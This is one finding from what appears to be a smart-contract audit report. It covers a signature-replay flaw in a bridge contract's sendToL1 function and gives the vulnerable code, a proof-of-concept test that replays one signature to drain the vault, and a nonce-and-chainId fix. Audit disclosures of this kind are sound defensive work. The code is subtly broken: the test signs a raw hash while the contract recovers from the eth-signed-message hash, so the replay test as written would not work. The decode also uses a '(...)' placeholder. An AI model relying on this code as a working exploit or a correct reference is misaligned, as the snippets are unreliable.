## Finding 1: Signature Replay — No Nonce or ChainId

**Severity**: 🔴 CRITICAL | **Pattern**: #27 — Signature Replay

#### Description
`L1BossBridge.sendToL1()` uses ECDSA signatures for authorization but the signed message contains only the target call data — no nonce, no chainId. Once signed, a withdrawal message can be replayed indefinitely on any chain.

#### Vulnerable Code
```solidity
// L1BossBridge.sol:112
function sendToL1(bytes memory message, uint8 v, bytes32 r, bytes32 s) public {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(
        keccak256(message) // ⚠️ no nonce, no chainId
    ), v, r, s);
    require(isSigner[signer]);
    // Execute the message as arbitrary calldata
    (address target, uint256 value, bytes memory data) = abi.decode(message, (...));
    (bool success,) = target.call{value: value}(data);
}
```

#### Impact
1. Signer authorizes withdrawal of 1000 tokens
2. Attacker replays same signature → drains another 1000 tokens
3. Repeats until vault is empty
4. **No revocation mechanism** — once signed, permanently valid

**Affected Funds**: All tokens in vault | **Likelihood**: HIGH

#### Proof of Concept
```solidity
function testSignatureReplay() public {
    // 1. Legitimate signer signs withdrawal
    bytes memory message = abi.encode(vault, 0, abi.encodeCall(IERC20.transfer, (alice, 1000e18)));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, keccak256(message));
    
    // 2. First withdrawal
    bossBridge.sendToL1(message, v, r, s); // ✅ works
    
    // 3. Second withdrawal with SAME signature
    bossBridge.sendToL1(message, v, r, s); // ✅ works again — replay!
    
    // 4. Third withdrawal...
    bossBridge.sendToL1(message, v, r, s); // ✅ still works
}
```

#### Recommended Mitigation
```solidity
// Include nonce and chainId in signed message
bytes32 structHash = keccak256(abi.encode(
    MESSAGE_TYPEHASH,
    target, value, data,
    nonces[signer]++,          // ← nonce
    block.chainid              // ← chainId
));
```

- Orbit Chain $81M (2024) — 7 validators forged
